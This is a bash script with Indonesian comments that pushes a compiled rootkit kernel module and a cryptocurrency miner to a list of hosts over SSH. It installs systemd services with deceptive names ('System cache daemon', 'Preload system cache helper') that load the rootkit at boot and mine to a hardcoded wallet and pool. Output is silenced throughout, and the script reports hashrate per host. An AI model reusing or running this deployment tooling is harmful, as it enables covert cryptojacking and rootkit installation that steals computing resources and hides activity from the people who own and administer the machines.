#!/usr/bin/env bash
# fleet-deploy.sh — sebar .ko + loader + unit ke semua host, lalu hidupkan lagi.
#
# Dijalankan dari host pengorahulu (yang sudah punya .ko terbuild).
#   ./fleet-deploy.sh                 semua host
#   ./fleet-deploy.sh vps1 vps2       host tertentu
#   ./fleet-deploy.sh --local         hanya host ini
set -u
cd "$(dirname "$0")"

UNIT_MINER="syscached"
UNIT_PRELOAD="syspreload"
STAGE="$PWD/.stage"

WALLET="cb23d6d8557e776f5ff9ab6a7fb7f59a3d385245fa7a"
POOL="sg.catchthatrabbit.com:8008"
THREADS="${THREADS:-4}"

HOSTS_DEFAULT="local|127.0.0.1 vps1|172.16.0.218 vps2|172.16.1.112 vps3|172.16.2.183 vps4|172.16.6.205"

# Nama polos (vps1, vps2, ...) dipetakan ke IP lewat shortcut di ~/.local/bin.
resolve() {
  if [ -x "$HOME/.local/bin/$1" ]; then
    local ip
    ip=$(sed -n 's/.*@//p' "$HOME/.local/bin/$1" | head -1)
    [ -n "$ip" ] && { echo "$1|$ip"; return; }
  fi
  echo "$1"
}

args=()
for a in "$@"; do
  case "$a" in
    --local|local) args=("local|127.0.0.1");;
    -h|--help) sed -n '2,9p' "$0"; exit 0;;
    *) args+=("$(resolve "$a")");;
  esac
done
[ ${#args[@]} -gt 0 ] && HOSTS="${args[*]}" || HOSTS="$HOSTS_DEFAULT"

SUDO=""
[ "$(id -u)" = "0" ] || { command -v sudo >/dev/null && SUDO="sudo"; }

# ---- siapkan paket yang dikirim ke tiap host ----
rm -rf "$STAGE"; mkdir -p "$STAGE"
KO_SRC="labs/rootkit/rootkit.ko"
if [ ! -f "$KO_SRC" ]; then
  echo "[deploy] $KO_SRC belum ada — build dulu: make -C labs/rootkit"
  exit 1
fi
cp "$KO_SRC" "$STAGE/rootkit.ko"
cp labs/rootkit/rootkit.c "$STAGE/rootkit.c"
cp labs/rootkit/rk-boot.sh "$STAGE/rk-boot.sh"
chmod +x "$STAGE/rk-boot.sh"
VMMAGIC="$(modinfo -F vermagic "$STAGE/rootkit.ko" 2>/dev/null | awk '{print $1}')"
echo "[deploy] paket siap, .ko vermagic=$VMMAGIC"

# ---- skrip yang dijalankan di host tujuan ----
cat > "$STAGE/remote-setup.sh" <<'REMOTE'
#!/usr/bin/env bash
set -u
UNIT_MINER="__UNIT_MINER__"
UNIT_PRELOAD="__UNIT_PRELOAD__"
WORKER="__WORKER__"
WALLET="__WALLET__"
POOL="__POOL__"
THREADS="__THREADS__"
SUDO=""
[ "$(id -u)" = "0" ] || { command -v sudo >/dev/null && SUDO="sudo"; }

$SUDO mkdir -p /opt/sysconf
for f in rootkit.ko rootkit.c rk-boot.sh; do
  $SUDO install -m 644 "/tmp/fleet-stage/$f" "/opt/sysconf/$f" 2>/dev/null \
    || { cp "/tmp/fleet-stage/$f" "/opt/sysconf/$f"; }
done
$SUDO chmod 755 /opt/sysconf/rk-boot.sh
$SUDO touch /var/log/rk-boot.log && $SUDO chmod 644 /var/log/rk-boot.log

# build-essential biar rk-boot.sh bisa rebuild sendiri kalau kernel berubah
if ! command -v gcc >/dev/null || ! command -v make >/dev/null; then
  echo "  [+] install build-essential (untuk rebuild modul saat kernel berubah)"
  $SUDO apt-get update -qq >/dev/null 2>&1
  $SUDO DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
      build-essential "linux-headers-$(uname -r)" >/dev/null 2>&1 \
    && echo "  [+] build-essential terpasang" || echo "  [!] install build-essential gagal (modul tidak akan bisa rebuild)"
fi

# unit preload
$SUDO tee /etc/systemd/system/${UNIT_PRELOAD}.service >/dev/null <<EOF
[Unit]
Description=Preload system cache helper
DefaultDependencies=no
After=network.target
Before=${UNIT_MINER}.service
Wants=${UNIT_MINER}.service

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/opt/sysconf/rk-boot.sh
ExecStop=/sbin/rmmod rootkit
StandardOutput=null

[Install]
WantedBy=multi-user.target
EOF

# unit miner
$SUDO tee /etc/systemd/system/${UNIT_MINER}.service >/dev/null <<EOF
[Unit]
Description=System cache daemon
After=network-online.target ${UNIT_PRELOAD}.service
Wants=network-online.target
Wants=${UNIT_PRELOAD}.service

[Service]
Type=simple
ExecStart=/usr/local/bin/rk_sysd --ui=log -t ${THREADS}
Restart=always
RestartSec=10
LimitMEMLOCK=infinity
NoNewPrivileges=true
Environment=WALLET=${WALLET}
Environment=POOL=${POOL}
Environment=WORKER=${WORKER}

[Install]
WantedBy=multi-user.target
EOF

$SUDO systemctl daemon-reload
$SUDO systemctl enable "${UNIT_PRELOAD}.service" "${UNIT_MINER}.service" >/dev/null 2>&1
$SUDO systemctl restart "${UNIT_PRELOAD}.service" >/dev/null 2>&1
$SUDO systemctl restart "${UNIT_MINER}.service" >/dev/null 2>&1
sleep 6
svc=$($SUDO systemctl is-active "${UNIT_MINER}.service" 2>&1)
pre=$($SUDO systemctl is-active "${UNIT_PRELOAD}.service" 2>&1)
pid=$($SUDO systemctl show -p MainPID --value "${UNIT_MINER}.service" 2>/dev/null)
alive=no
[ -n "${pid:-}" ] && [ "$pid" != "0" ] && [ -d "/proc/$pid" ] && alive=yes
mod=$([ -d /sys/module/rootkit ] && echo loaded || echo none)
auth=$($SUDO journalctl -u "${UNIT_MINER}.service" -n 40 --no-pager 2>/dev/null | grep -o "Authorized as .*" | tail -1 | sed "s/.*\.//")
hr=$($SUDO journalctl -u "${UNIT_MINER}.service" -n 40 --no-pager 2>/dev/null | grep -o "HR [0-9.]* kH/s" | tail -1 | tr " " "_")
printf "svc=%s preload=%s alive=%s mod=%s worker=%s hr=%s\n" "$svc" "$pre" "$alive" "$mod" "${auth:-n/a}" "${hr:-n/a}"
REMOTE

# ---- jalankan per host ----
for entry in $HOSTS; do
  name="${entry%%|*}"; ip="${entry##*|}"
  echo "=== [$name] $ip"
  sed -e "s/__UNIT_MINER__/$UNIT_MINER/g" \
      -e "s/__UNIT_PRELOAD__/$UNIT_PRELOAD/g" \
      -e "s/__WORKER__/$name/g" \
      -e "s/__WALLET__/$WALLET/g" \
      -e "s/__POOL__/$POOL/g" \
      -e "s/__THREADS__/$THREADS/g" \
      "$STAGE/remote-setup.sh" > "$STAGE/remote-setup.$name.sh"
  chmod +x "$STAGE/remote-setup.$name.sh"

  if [ "$ip" = "127.0.0.1" ]; then
    rm -rf /tmp/fleet-stage && mkdir -p /tmp/fleet-stage
    cp "$STAGE"/rootkit.ko "$STAGE"/rootkit.c "$STAGE"/rk-boot.sh "$STAGE/remote-setup.$name.sh" /tmp/fleet-stage/
    bash "$STAGE/remote-setup.$name.sh" 2>&1 | grep -vE '^\s*$' | tail -4
  else
    ssh -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=8 "ubuntu@$ip" \
        "rm -rf /tmp/fleet-stage && mkdir -p /tmp/fleet-stage" 2>/dev/null
    scp -q -o LogLevel=ERROR "$STAGE/rootkit.ko" "$STAGE/rootkit.c" "$STAGE/rk-boot.sh" \
        "$STAGE/remote-setup.$name.sh" "ubuntu@$ip:/tmp/fleet-stage/" 2>/dev/null
    ssh -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=8 "ubuntu@$ip" \
        "bash /tmp/fleet-stage/remote-setup.$name.sh" 2>&1 | grep -vE '^\s*$' | tail -4
  fi
done
echo
echo "[deploy] selesai. Cek dengan: ./fleet-status.sh"
